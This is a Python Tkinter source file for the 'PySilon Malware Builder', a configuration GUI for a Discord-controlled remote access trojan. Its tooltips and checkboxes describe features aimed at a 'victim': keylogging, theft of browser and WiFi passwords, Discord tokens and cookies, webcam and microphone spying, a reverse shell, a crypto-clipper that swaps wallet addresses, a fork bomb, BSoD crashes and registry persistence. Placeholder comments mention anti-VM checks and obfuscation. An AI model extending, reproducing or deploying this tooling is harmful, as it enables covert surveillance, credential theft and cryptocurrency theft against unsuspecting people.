import tkinter as tk
from tkinter import ttk
import random
import os
import pyperclip
import json
import tkinter.font as tkFont
from PIL import Image, ImageTk, ImageFont

tooltips = {
    'token_entry': 'Token obtained from Discord Developer Portal.',
    'guildids_entry': 'Target server IDs that will be used by PySilon. You can add more servers by separating them with semicolon(;).',
    'registry_entry': 'Name of PySilon\'s entry in Registry Editor. Filling this field is required if you want PySilon to run after reboot.',
    'directory_entry': 'Name of directory that will be created in "C:\\Users\\%username%" and used by PySilon.',
    'executable_entry': 'Name of executable that will contain PySilon on target PC. NOTE: Don\'t include ".exe" extension.',
    'implode_entry': 'A secret key that will be required to remotely remove PySilon from a PC using ".implode" command.',
    'keylogr': 'Log every key pressed by victim.',
    'scrnsht': 'Take screenshot of victim\'s PC',
    'f_manag': 'Explore, download, upload, remove or encrypt files.',
    'grabber': 'Grab saved WiFi passwords, Browser-saved passwords, Discord Tokens, Cookies, Browser history.',
    'mc_live': 'Stream live microphone input using voice channel.',
    'mc_recc': 'Record microphone input as long as victim has their PC turned on.',
    'process': 'Browse through processes, kill them, blacklist them (blacklisted process won\'t last more than a second).',
    'rev_shl': 'Execute remote CMD commands on victim\'s PC.',
    'webcam_': 'Take images using connected webcam.',
    'scrnrec': 'Record the victim\'s screen.',
    'inputbl': 'Block mouse and keyboard input.',
    'bluesod': 'Blue Screen of Death (kinda crashes victim\'s PC).',
    'crclipr': 'Swap copied crypto-wallet addresses to your defined ones.',
    'forkbmb': 'Crash victim\'s PC.',
    'messger': 'Communicate with your victim with plenty of ways.',
    'txtspee': 'Whatever you type, victim\'s computer will read it out loud.',
    'audctrl': 'Control victim\'s audio settings.',
    'monctrl': 'Turn off victim\'s monitors.',
    'webbloc': 'Block any website.',
    'jmpscar': 'Kinda nothing to add here.',
    'keystrk': 'Type words using your victim\'s keyboard.',
    'scrnman': 'Manipulate computer\'s graphics and display basically anything.'
}



class Builder:
    def __init__(self, master):
        self.master = master
        self.master.title('PySilon Malware Builder')

        self.create_navigation()

        self.canvas = tk.Canvas(self.master, border=0, highlightthickness=0)
        self.canvas.place(x=0,y=40,width=700,height=460)

        self.configuration = {
            'token': '',
            'guild_ids': '',
            'registry_name': '',
            'directory_name': '',
            'executable_name': '',
            'implode_secret': '',
            'icon_path': '',
            'functionalities': {
                'keylogr': True,
                'scrnsht': True,
                'regstry': True,
                'f_manag': True,
                'grabber': True,
                'mc_live': True,
                'mc_recc': True,
                'process': True,
                'rev_shl': True,
                'webcam_': True,
                'scrnrec': True,
                'inputbl': True,
                'bluesod': True,
                'crclipr': True,
                'forkbmb': True,
                'messger': True,
                'txtspee': True,
                'audctrl': True,
                'monctrl': True,
                'webbloc': True,
                'jmpscar': True,
                'keystrk': True,
                'scrnman': True
            }
        }

        self.general_settings()

    def new_background(self, demand=None):
        self.canvas.delete('all')
        selected_background = random.randint(1, len(os.listdir("resources/assets/builder_backgrounds")))
        if demand != None: selected_background = demand
        self.image = ImageTk.PhotoImage(Image.open(f'resources/assets/builder_backgrounds/{selected_background}.jpg'))
        self.canvas.create_image(0, 0, image=self.image, anchor=tk.NW)

    def create_navigation(self):
        self.button_frame = tk.Frame(self.master)
        self.button_frame.place(x=0, y=0, width=700, height=40)

        self.general_settings_button = tk.Button(
            self.button_frame,
            text='General Settings',
            font=tkFont.Font(family='Consolas', size=10),
            disabledforeground='white',
            command=self.general_settings
            )
        self.general_settings_button.place(x=0, y=0, width=135, height=40)

        self.functionality_settings_button = tk.Button(
            self.button_frame,
            text='Functionality Settings',
            font=tkFont.Font(family='Consolas', size=10),
            disabledforeground='white',
            command=self.functionality_settings
            )
        self.functionality_settings_button.place(x=135, y=0, width=175, height=40)

        self.compiling_settings_button = tk.Button(
            self.button_frame,
            text='Compiling Settings',
            font=tkFont.Font(family='Consolas', size=10),
            disabledforeground='white',
            command=self.compiling_settings
            )
        self.compiling_settings_button.place(x=310, y=0, width=145, height=40)

        self.pysilon_logo = tk.Label(
            self.button_frame,
            text='PySilon',
            font=tkFont.Font(family='Elephant', size=24)
            )
        self.pysilon_logo.place(x=549, y=-7)

        self.pysilon_sublogo = tk.Label(
            self.button_frame,
            text='M  A  L  W  A  R  E',
            font=tkFont.Font(family='Elephant', size=5),
            fg='red'
            )
        self.pysilon_sublogo.place(x=590, y=27, width=70)

        vertical_separator = ttk.Separator(self.button_frame, orient='vertical')
        vertical_separator.place(x=455, y=0, height=40, width=1)

        horizontal_separator = ttk.Separator(self.button_frame, orient='horizontal')
        horizontal_separator.place(x=455, y=39, height=1, width=245)
        
    def draw_initial_content(self):
        self.canvas.create_text(200, 150, text='Initial Content', font=('Helvetica', 16), fill='black')

    def save_configuration(self, temporary=True):
        try:
            self.configuration['token'] = self.token_entry.get()
            self.configuration['guild_ids'] = self.guildids_entry.get()
            self.configuration['registry_name'] = self.registry_entry.get()
            self.configuration['directory_name'] = self.directory_entry.get()
            self.configuration['executable_name'] = self.executable_entry.get()
            self.configuration['implode_secret'] = self.implode_entry.get()
        except: pass
        try:
            print(self.cbvar_keylogr.get())
        except: print('eror')

        with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'w', encoding='utf-8') as configuration_file:
            configuration_file.write(json.dumps(self.configuration))

    def load_configuration(self, temporary):
        with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'r', encoding='utf-8') as configuration_file:
            self.configuration = json.loads(''.join(configuration_file.readlines()))
        
    def general_settings(self):
        self.general_settings_button['state'] = tk.DISABLED
        self.general_settings_button['relief'] = 'flat'
        self.functionality_settings_button ['state'] = tk.NORMAL
        self.functionality_settings_button['relief'] = 'groove'
        self.compiling_settings_button['state'] = tk.NORMAL
        self.compiling_settings_button['relief'] = 'groove'
        self.save_configuration(True)
        self.new_background()
        self.load_configuration(True)

        self.canvas.create_text(230, 140, text='BOT Token:', fill='white', font=('Consolas', 16), anchor=tk.E)
        self.token_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33, show='*')
        self.token_entry.insert(0, self.configuration['token'])
        self.token_entry.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['token_entry']))
        self.token_entry.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(235, 140, window=self.token_entry, anchor='w')
        self.paste_token_icon = tk.PhotoImage(file='resources/assets/builder_elements/paste_icon.png')
        self.paste_token_button = tk.Button(
            self.canvas,
            image=self.paste_token_icon,
            disabledforeground='white',
            relief='flat',
            width=15,
            height=15,
            command=self.paste_token
            )
        self.canvas.create_window(640, 140, window=self.paste_token_button, anchor='w')
 
        self.canvas.create_text(230, 170, text='Guild IDs:', fill='white', font=('Consolas', 16), anchor=tk.E)
        self.guildids_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33)
        self.guildids_entry.insert(0, self.configuration['guild_ids'])
        self.guildids_entry.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['guildids_entry']))
        self.guildids_entry.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(235, 170, window=self.guildids_entry, anchor='w')

        self.canvas.create_text(230, 200, text='Registry Name:', fill='white', font=('Consolas', 16), anchor=tk.E)
        self.registry_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33)
        self.registry_entry.insert(0, self.configuration['registry_name'])
        self.registry_entry.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['registry_entry']))
        self.registry_entry.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(235, 200, window=self.registry_entry, anchor='w')

        self.canvas.create_text(230, 230, text='Directory Name:', fill='white', font=('Consolas', 16), anchor=tk.E)
        self.directory_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33)
        self.directory_entry.insert(0, self.configuration['directory_name'])
        self.directory_entry.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['directory_entry']))
        self.directory_entry.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(235, 230, window=self.directory_entry, anchor='w')

        self.canvas.create_text(230, 260, text='Executable Name:', fill='white', font=('Consolas', 16), anchor=tk.E)
        self.executable_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=28)
        self.executable_entry.insert(0, self.configuration['executable_name'])
        self.executable_entry.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['executable_entry']))
        self.executable_entry.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(235, 260, window=self.executable_entry, anchor='w')
        self.canvas.create_text(580, 260, text='.exe', fill='white', font=('Consolas', 16), anchor=tk.W)

        self.canvas.create_text(230, 290, text='Implode Password:', fill='white', font=('Consolas', 16), anchor=tk.E)
        self.implode_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33, show='*')
        self.implode_entry.insert(0, self.configuration['implode_secret'])
        self.implode_entry.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['implode_entry']))
        self.implode_entry.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(235, 290, window=self.implode_entry, anchor='w')


    def show_tooltip(self, event, tooltip_text):
        self.tooltip_label = tk.Label(self.canvas, text=tooltip_text, relief=tk.RIDGE, borderwidth=2, background="#0A0A10")
        self.tooltip_label.place(x=0, y=460, anchor=tk.SW)

    def hide_tooltip(self, event):
        self.tooltip_label.place_forget()

    def paste_token(self):
        self.token_entry.insert(0, pyperclip.paste())

    def functionality_settings(self):
        self.general_settings_button['state'] = tk.NORMAL
        self.general_settings_button['relief'] = 'groove'
        self.functionality_settings_button ['state'] = tk.DISABLED
        self.functionality_settings_button['relief'] = 'flat'
        self.compiling_settings_button['state'] = tk.NORMAL
        self.compiling_settings_button['relief'] = 'groove'
        self.save_configuration(True)
        self.new_background(1)
        self.transparent_background = tk.PhotoImage(width=1, height=1)

        x_start, y_start, x_delta, y_delta = 50, 50, 8, 35

        self.cbvar_keylogr = tk.BooleanVar(value=True)
        self.cb_keylogr = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='keylogger',
            font=('Consolas', 12),
            variable=self.cbvar_keylogr,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.cb_keylogr.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['keylogr']))
        self.cb_keylogr.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(x_start, y_start+y_delta*0, window=self.cb_keylogr, anchor='w')

        self.cbvar_scrnsht = tk.BooleanVar(value=True)
        self.cb_scrnsht = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='take screenshots',
            font=('Consolas', 12),
            variable=self.cbvar_scrnsht,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.cb_scrnsht.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['scrnsht']))
        self.cb_scrnsht.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(x_start, y_start+y_delta*1, window=self.cb_scrnsht, anchor='w')

        self.cbvar_fmanag = tk.BooleanVar(value=True)
        self.cb_fmanag = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='file management',
            font=('Consolas', 12),
            variable=self.cbvar_fmanag,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.cb_fmanag.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['f_manag']))
        self.cb_fmanag.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(x_start, y_start+y_delta*2, window=self.cb_fmanag, anchor='w')

        self.cbvar_grabber = tk.BooleanVar(value=True)
        self.cb_grabber = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='grabber',
            font=('Consolas', 12),
            variable=self.cbvar_grabber,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.cb_grabber.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['grabber']))
        self.cb_grabber.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(x_start, y_start+y_delta*3, window=self.cb_grabber, anchor='w')

        self.cbvar_mclive = tk.BooleanVar(value=True)
        self.cb_mclive = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='stream live microphone',
            font=('Consolas', 12),
            variable=self.cbvar_mclive,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.cb_mclive.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['mc_live']))
        self.cb_mclive.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(x_start, y_start+y_delta*4, window=self.cb_mclive, anchor='w')

        self.cbvar_mcrecc = tk.BooleanVar(value=True)
        self.cb_mcrecc = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='24/7 microphone recording',
            font=('Consolas', 12),
            variable=self.cbvar_mcrecc,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.cb_mcrecc.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['mc_recc']))
        self.cb_mcrecc.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(x_start, y_start+y_delta*5, window=self.cb_mcrecc, anchor='w')

        self.cbvar_process = tk.BooleanVar(value=True)
        self.cb_process = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='manage processes',
            font=('Consolas', 12),
            variable=self.cbvar_process,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.cb_process.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['process']))
        self.cb_process.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(x_start, y_start+y_delta*6, window=self.cb_process, anchor='w')

        self.cbvar_revshl = tk.BooleanVar(value=True)
        self.cb_revshl = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='reverse shell',
            font=('Consolas', 12),
            variable=self.cbvar_revshl,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.cb_revshl.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['rev_shl']))
        self.cb_revshl.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(x_start, y_start+y_delta*7, window=self.cb_revshl, anchor='w')
        
        self.cbvar_webcam = tk.BooleanVar(value=True)
        self.cb_webcam = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='webcam handling',
            font=('Consolas', 12),
            variable=self.cbvar_webcam,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.cb_webcam.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['webcam_']))
        self.cb_webcam.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(x_start, y_start+y_delta*8, window=self.cb_webcam, anchor='w')

        self.cbvar_scrnrec = tk.BooleanVar(value=True)
        self.cb_scrnrec = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='screen recording',
            font=('Consolas', 12),
            variable=self.cbvar_scrnrec,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.cb_scrnrec.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['scrnrec']))
        self.cb_scrnrec.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(x_start, y_start+y_delta*9, window=self.cb_scrnrec, anchor='w')

        self.cbvar_inputbl = tk.BooleanVar(value=True)
        self.cb_inputbl = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='input blocking',
            font=('Consolas', 12),
            variable=self.cbvar_inputbl,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.cb_inputbl.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['inputbl']))
        self.cb_inputbl.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(x_start, y_start+y_delta*10, window=self.cb_inputbl, anchor='w')

        self.cbvar_crclipr = tk.BooleanVar(value=True)
        self.cb_crclipr = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='crypto-clipper',
            font=('Consolas', 12),
            variable=self.cbvar_crclipr,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.cb_crclipr.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['crclipr']))
        self.cb_crclipr.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*0, window=self.cb_crclipr, anchor='w')

        self.cbvar_messger = tk.BooleanVar(value=True)
        self.cb_messger = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='messager',
            font=('Consolas', 12),
            variable=self.cbvar_messger,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.cb_messger.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['messger']))
        self.cb_messger.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*1, window=self.cb_messger, anchor='w')

        self.cbvar_txtspee = tk.BooleanVar(value=True)
        self.cb_txtspee = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='Text-to-Speech',
            font=('Consolas', 12),
            variable=self.cbvar_txtspee,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.cb_txtspee.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['txtspee']))
        self.cb_txtspee.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*2, window=self.cb_txtspee, anchor='w')

        self.cbvar_audctrl = tk.BooleanVar(value=True)
        self.cb_audctrl = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='audio controlling',
            font=('Consolas', 12),
            variable=self.cbvar_audctrl,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.cb_audctrl.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['audctrl']))
        self.cb_audctrl.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*3, window=self.cb_audctrl, anchor='w')

        self.cbvar_monctrl = tk.BooleanVar(value=True)
        self.cb_monctrl = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='monitors controlling',
            font=('Consolas', 12),
            variable=self.cbvar_monctrl,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.cb_monctrl.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['monctrl']))
        self.cb_monctrl.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*4, window=self.cb_monctrl, anchor='w')

        self.cbvar_webbloc = tk.BooleanVar(value=True)
        self.cb_webbloc = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='website blocking',
            font=('Consolas', 12),
            variable=self.cbvar_webbloc,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.cb_webbloc.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['webbloc']))
        self.cb_webbloc.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*5, window=self.cb_webbloc, anchor='w')

        self.cbvar_jmpscar = tk.BooleanVar(value=True)
        self.cb_jmpscar = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='jumpscare',
            font=('Consolas', 12),
            variable=self.cbvar_jmpscar,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.cb_jmpscar.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['jmpscar']))
        self.cb_jmpscar.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*6, window=self.cb_jmpscar, anchor='w')

        self.cbvar_keystrk = tk.BooleanVar(value=True)
        self.cb_keystrk = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='keystroke type',
            font=('Consolas', 12),
            variable=self.cbvar_keystrk,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.cb_keystrk.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['keystrk']))
        self.cb_keystrk.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*7, window=self.cb_keystrk, anchor='w')

        self.cbvar_scrnman = tk.BooleanVar(value=True)
        self.cb_scrnman = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='screen manipulation',
            font=('Consolas', 12),
            variable=self.cbvar_scrnman,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.cb_scrnman.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['scrnman']))
        self.cb_scrnman.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*8, window=self.cb_scrnman, anchor='w')

        self.cbvar_bluesod = tk.BooleanVar(value=True)
        self.cb_bluesod = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='BSoD',
            font=('Consolas', 12),
            variable=self.cbvar_bluesod,
            command=self.save_configuration,
            onvalue=True,
            offvalue=False
        )
        self.cb_bluesod.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['bluesod']))
        self.cb_bluesod.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*9, window=self.cb_bluesod, anchor='w')



    def compiling_settings(self):
        self.general_settings_button['state'] = tk.NORMAL
        self.general_settings_button['relief'] = 'groove'
        self.functionality_settings_button ['state'] = tk.NORMAL
        self.functionality_settings_button['relief'] = 'groove'
        self.compiling_settings_button['state'] = tk.DISABLED
        self.compiling_settings_button['relief'] = 'flat'
        self.new_background()
        self.canvas.create_text(200, 150, text='Content for Button 3', font=('Helvetica', 16), fill='red')

        # Icon
        # Anti-VM
        # Obfuscation





def main():
    root = tk.Tk()
    Builder(root)
    root.geometry('700x500')
    #root.wm_attributes('-transparentcolor', '#ab23ff')
    root.tk_setPalette(background='#0A0A10', foreground='white', activeBackground='#0A0A10', activeForeground='white')
    root.mainloop()

if __name__ == '__main__':
    main()
